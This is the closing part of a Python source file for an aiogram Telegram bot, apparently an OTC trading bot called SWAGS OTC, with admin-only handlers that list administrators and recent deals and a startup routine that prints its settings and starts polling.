async def list_admins_callback(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
        return
    admin_list = "\n".join([f"• {aid}" for aid in admins])
    await callback.message.answer(f"👥 Список админов:\n\n{admin_list}")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "all_deals")
async def all_deals_callback(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔️ Доступ запрещён", show_alert=True)
        return
    if not deals:
        await callback.message.answer("📭 Нет сделок")
    else:
        text = "📋 ВСЕ СДЕЛКИ\n\n"
        for deal_id, deal in list(deals.items())[-20:]:
            text += f"{deal_id} | {deal['status']} | {deal['amount']} {deal['currency']}\n"
        await callback.message.answer(text)
    await callback.answer()

# ========== ЗАПУСК ==========
async def main():
    print(f"🚀 SWAGS OTC запущен")
    print(f"👑 Главный админ: {MASTER_ADMIN_ID}")
    print(f"👥 Всего админов: {len(admins)}")
    print(f"🤖 Бот: @swags_otc_bot")
    print(f"💳 Доступные валюты: TON, STARS, RUB, UAH")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())